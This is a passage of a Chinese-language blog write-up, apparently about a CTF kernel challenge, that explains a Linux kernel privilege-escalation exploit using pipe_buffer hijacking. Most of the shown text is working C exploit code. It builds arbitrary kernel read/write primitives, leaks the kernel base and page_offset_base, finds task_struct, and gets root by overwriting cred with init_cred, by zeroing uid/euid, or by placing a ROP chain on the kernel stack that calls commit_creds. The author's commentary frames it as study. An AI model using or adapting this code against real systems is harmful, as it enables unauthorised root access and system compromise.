class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_4th_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h3><p>之前已经介绍了ABC的作用,以下就是初始化准备过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setup_evil_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe pointing to 4th */</span></span><br><span class="line">    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">    evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>真正的任意读写封装</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_read_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to read */</span></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read out data */</span></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_write_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write data into dst page */</span></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="泄露信息"><a href="#泄露信息" class="headerlink" title="泄露信息"></a>泄露信息</h3><p>我们现在已经拥有了任意读写的能力</p>
<p>泄露kernel text</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span></span><br><span class="line"><span class="comment"> * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span></span><br><span class="line"><span class="comment"> * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span></span><br><span class="line"><span class="comment"> * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span></span><br><span class="line"><span class="comment"> * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vmemmap_base = (<span class="type">size_t</span>) info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">        kernel_base = buf[<span class="number">0</span>] -  <span class="number">0x070</span>;</span><br><span class="line">        kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">               kernel_base, kernel_offset);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br></pre></td></tr></table></figure>
<p>0x9d000/0x1000=157</p>
<p>至于开头那段注释,可能是我理解能力不够强,按照我的理解似乎是有点问题的</p>
<p><code>arttnba3</code>大佬提到kaslr的粒度是256m,但是<code>and pages of size 0x1000000 is 1GB MEM</code>中的<code>0x1000000</code>显然不是256m,之后的代码以及<code>just vmemmap_base -= 256MB</code>与之都对不上</p>
<hr>
<p>之后再在内存中搜索task结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For a machine with MEM less than 256M, we can simply get the:</span></span><br><span class="line"><span class="comment"> *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span></span><br><span class="line"><span class="comment"> * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span></span><br><span class="line"><span class="comment"> * So we need to find another way to calculate the page_offset_base.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Luckily the task_struct::ptraced points to itself, so we can get the</span></span><br><span class="line"><span class="comment"> * page_offset_base by vmmemap and current task_struct as we know the page.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Note that the offset of different filed should be referred to your env.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    comm_addr = memmem(buf, <span class="number">0xf00</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123;  <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">        current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">        page_offset_base = (comm_addr[<span class="number">-50</span>]&amp;<span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;<span class="comment">//直接映射区的首页</span></span><br><span class="line">        page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">               (<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">               page_offset_base);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">               <span class="string">&quot;0x%lx\n\n&quot;</span>, current_task);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>arttnba3</code>师傅提供了三种提权的方法,其中有两种并不常见</p>
<p>我们一一解读一下</p>
<h3 id="修改cred"><a href="#修改cred" class="headerlink" title="修改cred"></a>修改cred</h3><p>第一种是较为常见的修改当前进程的task_struct结构体,一般两种形式</p>
<ul>
<li>修改<code>task_struct-&gt;cred</code>为<code>&amp;init_cred</code></li>
<li>修改<code>task_struct-&gt;cred-&gt;uid和euid</code>为<code>0</code></li>
</ul>
<p>arttnba3大佬选择的是第一种方法</p>
<p>由于 <code>init_cred</code> 的符号有的时候是不在 <code>/proc/kallsyms</code> 中导出的(当然这题是导出了的)</p>
<p>所以大佬展示了一种方法,即通过解析 <code>task_struct</code> 不停的向上寻找父进程,直到找到<code>init</code>进程,<code>init</code>是所有进程的父进程,且其拥有<code>root</code>权限,当然cred就是<code>init_cred</code></p>
<p>将其保存并用以替换current_task的cred,以此提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_task_overwrite</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);</span><br><span class="line"></span><br><span class="line">        tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) ptask_page_addr, buf);</span><br><span class="line">        arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (ptask_page_addr+<span class="number">0x40</span>),&amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">        <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init_task = parent_task;</span><br><span class="line">    init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">    init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>),</span><br><span class="line">                            &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后个人自己实现了一下第二种方法,直接修改uid和euid为0,思路更直接</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llu\n&quot;</span>,cred_page);</span><br><span class="line"><span class="type">int</span> offset=cred_page&amp;<span class="number">0xfff</span>;</span><br><span class="line">   cred_page=direct_map_addr_to_page_addr(cred_page);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">   evil_2nd_buf.page = cred_page;</span><br><span class="line">   evil_2nd_buf.offset = offset+<span class="number">4</span>;</span><br><span class="line">   evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> src[<span class="number">24</span>];</span><br><span class="line"><span class="built_in">memset</span>(src,<span class="number">0</span>,<span class="number">24</span>);</span><br><span class="line"><span class="type">int</span> len=<span class="number">24</span>;</span><br><span class="line">   <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">   write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">         temp_zero_buf, </span><br><span class="line">         TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">   write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* write data into dst page */</span></span><br><span class="line">   write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line">   get_root_shell();</span><br></pre></td></tr></table></figure>
<h3 id="覆写内核栈"><a href="#覆写内核栈" class="headerlink" title="覆写内核栈"></a>覆写内核栈</h3><p>覆写内核栈实现rop自然不是什么少见的利用手法,但是这里<code>arttnba3</code>大佬找到内核栈的方法还是第一次见</p>
<p>学习一下</p>
<blockquote>
<p> 由于 page 结构体数组与物理内存页一一对应的缘故，我们可以很轻易地在物理地址与 page 结构体地址间进行转换，而在页表当中存放的是物理地址，我们不难想到的是<strong>我们可以通过解析当前进程的页表来获取到内核栈的物理地址，从而获取到内核栈对应的 page</strong>，之后我们可以<strong>直接向内核栈上写 ROP chain 来完成任意代码执行</strong></p>
<p>页表的地址可以通过 <code>mm_struct</code> 获取， <code>mm_struct</code> 地址可以通过 <code>task_struct</code> 获取，内核栈地址同样可以通过 <code>task_struct</code> 获取，那么这一切其实是水到渠成的事情：</p>
</blockquote>
<p>简单来说就是获取栈对应的<code>page</code>,然后在页上布置gadget</p>
<p>因为栈上是ret调用gadget,所以绕过了CFI</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_rop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>], idx = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* reading the page table directly to get physical addr of kernel stack*/</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);</span><br><span class="line">    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="comment">/* N/X bit */</span></span><br><span class="line">    stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct the ROP */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++) &#123;</span><br><span class="line">        rop[idx++] = RET + kernel_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">    rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="number">54</span> + kernel_offset;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) get_root_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span 